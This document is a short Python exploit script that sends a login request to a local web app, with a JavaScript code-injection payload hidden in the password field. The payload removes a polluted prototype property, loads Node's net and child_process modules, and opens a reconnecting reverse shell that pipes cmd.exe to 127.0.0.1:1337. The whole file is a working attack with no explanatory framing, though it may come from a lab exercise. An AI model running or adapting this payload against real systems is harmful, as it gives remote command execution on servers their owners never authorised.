import requests
import json




session = requests.Session()
r = session.post("http://localhost:3000/login", data = {
    "username": "bob",
    "password" : "\'}); delete Object.prototype.userAutoCreateTemplate;var require = global.require || global.process.mainModule.constructor._load;var net = require('net');\n\t\t\tvar spawn = require('child_process').spawn;HOST=\"127.0.0.1\";PORT=\"1337\";TIMEOUT=\"5000\";if (typeof String.prototype.contains === 'undefined ') { String.prototype.contains = function(it) { returnthis.indexOf(it) != -1; }; }function c(HOST,PORT) {var client = new net.Socket();client.connect(PORT, HOST, function() {var sh = spawn('cmd.exe',[]);client.write(\"Connected\\r\\n\");client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);sh.on('exit',function(code,signal){client.end(\"Disconnected\\r\\n\");});});client.on('error', function(e) {setTimeout(function() {c(HOST,PORT)}, TIMEOUT);});}c(HOST,PORT);"
}
                 )
print(r.text)